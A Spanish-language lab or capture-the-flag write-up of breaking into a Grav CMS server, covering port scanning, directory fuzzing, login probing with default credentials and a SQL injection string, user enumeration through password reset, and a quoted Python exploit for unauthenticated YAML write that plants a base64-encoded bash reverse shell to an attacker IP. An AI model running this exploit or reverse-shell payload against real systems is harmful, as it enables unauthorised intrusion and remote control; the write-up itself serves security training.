

Realizamos un nmap para ver los puertos abiertos y ver qué están corriendo

```bash
nmap -sCV -p- --open -n -Pn -vvv IP_víctima -oN nom_resultado.txt
```

![](../../Imágenes/Pasted%20image%2020260108205238.png)


Encontramos 2 puertos abiertos:
### 22 SSH
### 80 HTTP

![](../../Imágenes/Pasted%20image%2020260108205256.png)


Entrando en la web del puerto 80 encontramos el directorio de `grav-admin/`

![](../../Imágenes/Pasted%20image%2020260108205707.png)


Vemos que usa el *CMS* de *Grav* y usa el lenguaje de programación *PHP* 

![](../../Imágenes/Pasted%20image%2020260108210024.png)


Realizamos un *Fuzzing* de directorios

```bash
feroxbuster --url http://$IP_victima -w ruta_diccionario
```

![](../../Imágenes/Pasted%20image%2020260108210917.png)


Encontramos el inicio de sesión de administrador

![](../../Imágenes/Pasted%20image%2020260108210935.png)



![](../../Imágenes/Pasted%20image%2020260108210948.png)

Probamos credenciales por defecto como admin:admin, inyecciones sql básicas `' OR '1'='1` y se comprueba la función de reseteo de contraseña la cual no es funcional ya que no manda correos o eso parece, pero con ello, tenemos una forma de validar usuarios --> https://github.com/advisories/GHSA-q3qx-cp62-f6m7 en el que si ponemos el usuario que queremos que se resetee la contraseña, nos avisa de si existe o no ese usuario en la base de datos

Usuario no existente

![](../../Imágenes/Pasted%20image%2020260108212054.png)

Usuario existente

![](../../Imágenes/Pasted%20image%2020260108212148.png)


Si buscamos el *CMS* encontramos unos exploits entre el que destaca la subida de archivos YAML sin autenticarse (ya que no tenemos credenciales)

![](../../Imágenes/Pasted%20image%2020260109172302.png)


Vemos el código del exploit

![](../../Imágenes/Pasted%20image%2020260109172507.png)


```python
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.1.2" #ponemos la ip objetivo (tiene que apuntar al grav-admin)
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/ 
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5>
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```


Modificamos el script y lo ejecutamos

![](../../Imágenes/Pasted%20image%2020260109174330.png)


Nos ponemos a la escucha por el puerto 80 y conseguimos una shell con la que ejecutar comandos

![](../../Imágenes/Pasted%20image%2020260109174445.png)


